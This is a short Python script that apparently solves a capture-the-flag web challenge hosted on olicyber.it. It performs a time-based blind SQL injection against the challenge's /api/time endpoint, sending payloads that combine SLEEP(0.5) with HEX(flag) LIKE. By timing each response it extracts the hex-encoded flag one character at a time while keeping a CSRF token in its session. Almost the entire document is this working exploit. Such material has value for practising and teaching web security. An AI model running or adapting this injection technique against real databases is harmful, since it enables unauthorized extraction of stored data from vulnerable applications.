from time import time
import requests
import binascii, string

class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

inj = Inj("http://web-17.challs.olicyber.it")
done = True
flag = ""
while done:
    done = False
    for i in "abcdef0123456789":
        if i == '%' or i == '_':
            continue
        start = time()
        inj.time(f"1' AND (SELECT SLEEP(0.5) FROM flags WHERE HEX(flag) LIKE '{flag + i}%')='1")

        elapsed = time() - start
        if elapsed > 0.5:
            flag += i
            print(flag)
            done = True
print(f"The flag is: {bytes.fromhex(flag).decode()}")
